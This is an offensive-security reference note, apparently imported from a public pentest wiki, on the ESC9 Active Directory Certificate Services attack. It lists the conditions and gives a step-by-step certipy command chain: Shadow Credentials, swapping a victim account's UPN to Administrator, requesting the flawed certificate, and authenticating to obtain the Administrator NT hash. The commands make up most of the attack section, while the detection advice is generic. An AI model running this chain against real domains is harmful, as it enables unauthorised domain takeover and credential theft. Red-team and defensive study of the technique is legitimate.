---
title: Active Directory - Certificate ESC9
type: technique
tags: [active-directory, adcs, certificates, esc9, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Certificate ESC9

## What it is

**Requirements**.

## How it works

ESC9 abuses the `CT_FLAG_NO_SECURITY_EXTENSION` flag on certificate templates, which causes the issued certificate to omit the security extension that binds the certificate to the enrolling account's objectSid. When `StrongCertificateBindingEnforcement` is not set to `2`, the CA accepts authentication from a certificate whose UPN no longer matches the actual account. An attacker with `GenericWrite` over an account changes that account's UPN to match a target, enrolls a certificate under the ESC9 template, restores the UPN, then authenticates as the target using the issued certificate.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## ESC9 - No Security Extension

**Requirements**

* `StrongCertificateBindingEnforcement` set to `1` (default) or `0`
* Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
* Certificate specifies `Any Client` authentication EKU
* `GenericWrite` over any account A to compromise any account B

**Scenario**

<John@corp.local> has **GenericWrite** over <Jane@corp.local>, and we want to compromise <Administrator@corp.local>.
<Jane@corp.local> is allowed to enroll in the certificate template ESC9 that specifies the **CT_FLAG_NO_SECURITY_EXTENSION** flag in the **msPKI-Enrollment-Flag** value.

* Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)

```ps1
certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
```

* Change the **userPrincipalName** of Jane to be Administrator. :warning: leave the `@corp.local` part

```ps1
certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
```

* Request the vulnerable certificate template ESC9 from Jane's account.

```ps1
certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
# userPrincipalName in the certificate is Administrator 
# the issued certificate contains no "object SID"
```

* Restore userPrincipalName of Jane to <Jane@corp.local>.

```ps1
certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
```

* Authenticate with the certificate and receive the NT hash of the <Administrator@corp.local> user.

```ps1
certipy auth -pfx administrator.pfx -domain corp.local
# Add -domain <domain> to your command line since there is no domain specified in the certificate.
```

## References

* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[certipy]]
- [[john]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
